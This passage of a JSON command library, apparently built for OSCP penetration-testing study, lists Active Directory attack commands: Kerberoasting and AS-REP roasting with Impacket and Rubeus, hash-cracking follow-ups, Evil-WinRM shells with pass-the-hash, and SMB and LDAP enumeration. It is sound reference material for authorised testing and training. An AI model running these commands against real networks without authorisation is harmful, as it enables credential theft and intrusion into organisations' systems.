        "-request": "Request TGT for users"
      },
      "methodology_guidance": {
        "after_success": "Crack AS-REP hashes with hashcat/john"
      }
    },
    {
      "id": "getuserspns-kerberoast",
      "name": "Impacket GetUserSPNs - Kerberoasting",
      "description": "Request service tickets for Kerberoastable accounts",
      "command": "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain user",
          "example": "user",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "Domain controller IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "impacket",
        "kerberoasting",
        "kerberos",
        "active-directory"
      ],
      "prerequisites": [],
      "next_steps": [],
      "flag_explanations": {
        "-request": "Request TGS tickets",
        "-dc-ip": "Domain controller IP",
        "-outputfile": "Save hashes to file"
      },
      "methodology_guidance": {
        "after_success": "Crack TGS hashes with hashcat mode 13100"
      }
    },
    {
      "id": "evil-winrm-shell",
      "name": "Evil-WinRM - PowerShell Remoting",
      "description": "Connect to Windows via WinRM for PowerShell access",
      "command": "evil-winrm -i <TARGET> -u <USER> -p <PASS>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "evil-winrm",
        "winrm",
        "active-directory",
        "powershell"
      ],
      "prerequisites": [],
      "next_steps": [],
      "flag_explanations": {
        "-i": "Target IP",
        "-u": "Username",
        "-p": "Password",
        "-H": "NTLM hash (pass-the-hash)"
      },
      "methodology_guidance": {
        "after_success": "Upload files Execute PowerShell commands"
      }
    },
    {
      "id": "rpcclient-enum",
      "name": "RPCClient - Enumerate SMB",
      "description": "Enumerate SMB/MSRPC information",
      "command": "rpcclient -U '<USER>%<PASS>' <TARGET>",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username (or empty for null session)",
          "example": "",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password (or empty for null session)",
          "example": "",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "rpcclient",
        "smb",
        "enumeration",
        "active-directory"
      ],
      "next_steps": [],
      "methodology_guidance": {
        "after_success": "enumdomusers (list users) enumdomgroups (list groups) queryuser <RID>"
      }
    },
    {
      "id": "smbclient-connect",
      "name": "SMBClient - Connect to Share",
      "description": "Connect to SMB share and browse files",
      "command": "smbclient //<TARGET>/<SHARE> -U <USER>",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "Share name",
          "example": "C$",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "smbclient",
        "smb",
        "active-directory",
        "shares"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-U": "Username",
        "-N": "No password (null session)",
        "-L": "List shares"
      },
      "methodology_guidance": {
        "after_success": "ls (list files) get <FILE> (download) put <FILE> (upload)"
      }
    },
    {
      "id": "smbmap-shares",
      "name": "SMBMap - Enumerate Shares",
      "description": "Enumerate SMB shares and permissions",
      "command": "smbmap -H <TARGET> -u <USER> -p <PASS>",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "guest",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "smbmap",
        "smb",
        "active-directory",
        "shares"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-H": "Target host",
        "-u": "Username",
        "-p": "Password",
        "-R": "Recursively list shares"
      },
      "methodology_guidance": {
        "after_success": "Access writable shares Download sensitive files"
      }
    },
    {
      "id": "ldapsearch-ad",
      "name": "LDAP Search - AD Enumeration",
      "description": "Query Active Directory via LDAP",
      "command": "ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' '(objectClass=user)'",
      "category": "active-directory",
      "subcategory": "enumeration",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "DC IP",
          "example": "192.168.1.10",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "user",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain",
          "example": "domain.local",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Password123",
          "required": true
        },
        {
          "name": "<BASE_DN>",
          "description": "Base DN",
          "example": "DC=domain,DC=local",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "ldapsearch",
        "ldap",
        "active-directory",
        "enumeration"
      ],
      "next_steps": [],
      "methodology_guidance": {
        "after_success": "Extract users Find service accounts Check descriptions for passwords"
      }
    },
    {
      "id": "rubeus-asreproast",
      "name": "Rubeus - AS-REP Roasting",
      "description": "Perform AS-REP roasting on Windows",
      "command": "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "tags": [
        "oscp",
        "rubeus",
        "as-rep-roasting",
        "kerberos",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "next_steps": [],
      "flag_explanations": {
        "/format:hashcat": "Output format for hashcat",
        "/outfile": "Output file for hashes",
        "/user:<USER>": "Target specific user"
      },
      "methodology_guidance": {
        "after_success": "Transfer hashes to attacker Crack with hashcat"
      }
    },
    {
      "id": "rubeus-kerberoast",
      "name": "Rubeus - Kerberoasting",
      "description": "Perform Kerberoasting on Windows",
      "command": "Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "tags": [
        "oscp",
        "rubeus",
        "kerberoasting",
        "kerberos",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "next_steps": [],
      "flag_explanations": {
        "/format:hashcat": "Output format for hashcat",
        "/outfile": "Output file for hashes",
        "/user:<USER>": "Target specific SPN account"
      },
      "methodology_guidance": {
        "after_success": "Crack TGS hashes with hashcat mode 13100"
      }
    }
  ]
}
